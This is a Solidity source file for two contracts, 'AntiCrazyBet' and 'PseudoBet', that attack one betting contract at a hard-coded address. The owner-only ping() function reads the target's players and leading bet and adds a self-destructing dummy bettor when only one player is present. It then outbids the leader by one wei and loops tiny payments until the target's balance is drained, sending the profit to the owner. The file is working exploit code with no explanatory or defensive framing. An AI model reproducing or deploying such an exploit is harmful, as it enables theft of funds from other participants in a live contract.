1 pragma solidity ^0.5.0;
2 
3 interface TargetInterface {
4     function getPlayersNum() external view returns (uint256);
5     function getLeader() external view returns (address payable, uint256);
6 }
7 
8 contract PseudoBet {
9     constructor(address payable targetAddress) public payable {
10         (bool ignore,) = targetAddress.call.value(msg.value)("");
11         ignore;
12         selfdestruct(msg.sender);
13     }
14 }
15 
16 contract AntiCrazyBet {
17     
18     address payable private constant targetAddress = 0xE0C0c6bE9a09c9df23522db2b69D39Ccb3c3DC98;
19     address payable private owner = msg.sender;
20     
21     modifier onlyOwner {
22         require(msg.sender == owner);
23         _;
24     }
25     
26     constructor() public payable {
27     }
28     
29     function ping(bool _keepBalance) public payable onlyOwner {
30         uint256 ourBalanceInitial = address(this).balance;
31 
32         TargetInterface target = TargetInterface(targetAddress);
33         
34         uint256 playersNum = target.getPlayersNum();
35         require(playersNum > 0);
36         
37         if (playersNum == 1) {
38             (new PseudoBet).value(1 wei)(targetAddress);
39         }
40         
41         (, uint256 leaderBet) = target.getLeader();
42         uint256 bet = leaderBet + 1;
43         
44         (bool success,) = targetAddress.call.value(bet)("");
45         require(success);
46         
47         for (uint256 ourBetIndex = 0; ourBetIndex < 100; ourBetIndex++) {
48             if (targetAddress.balance == 0) {
49                 break;
50             }
51 
52             (bool anotherSuccess,) = targetAddress.call.value(1 wei)("");
53             require(anotherSuccess);
54         }
55         
56         require(address(this).balance > ourBalanceInitial);
57         
58         if (!_keepBalance) {
59             owner.transfer(address(this).balance);
60         }
61     }
62     
63     function withdraw() public onlyOwner {
64         owner.transfer(address(this).balance);
65     }    
66     
67     function kill() public onlyOwner {
68         selfdestruct(owner);
69     }    
70     
71     function () external payable {
72     }
73     
74 }